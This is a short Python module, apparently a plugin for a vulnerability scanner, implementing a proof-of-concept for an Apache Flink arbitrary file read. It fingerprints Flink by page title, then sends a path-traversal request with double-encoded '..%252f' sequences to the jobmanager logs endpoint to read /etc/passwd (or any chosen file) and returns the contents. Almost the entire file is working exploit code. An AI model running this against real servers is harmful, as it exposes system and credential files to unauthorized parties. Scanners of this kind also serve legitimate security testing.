# -*- coding:utf-8 -*-
# Apache Flink 任意文件读取

from .. import requestUtil
from ServiceScanModel.models import ServiceScan


def flink_file_poc(url, filename="/etc/passwd", type="poc"):
    resp = requestUtil.get(
        url + "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f" + filename.replace(
            "/", "%252f"))
    print(resp.text)
    if type == "poc":
        if "root" in resp.text:
            return resp.text
    else:
        return resp.text


def fingerprint(service):
    try:
        if "Apache Flink" in service.title:
            return True
    except:
        return False


def poc(service: ServiceScan):
    try:
        result = flink_file_poc(service.url)
        if result:
            return ["Apache Flink 任意文件读取", "<b>/etc/passwd</b>: <br>"+"<br>".join(result.split("\n")[:2]) + "<br>..."]
    except:
        return []
